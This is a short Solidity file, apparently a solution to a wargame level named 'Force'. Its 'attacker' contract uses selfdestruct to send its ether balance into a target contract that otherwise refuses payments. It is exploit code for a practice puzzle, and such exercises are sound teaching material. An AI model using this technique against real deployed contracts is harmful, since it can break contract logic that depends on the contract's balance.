// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./origin.sol";

contract attacker {

Force forceContract;

constructor (address _forceAddress) {
    forceContract = Force(_forceAddress);
}

// selfdestruct forces all balance of this contract to be sent to forceContract
function destroy() external payable {
    selfdestruct(payable(address(forceContract)));
}

}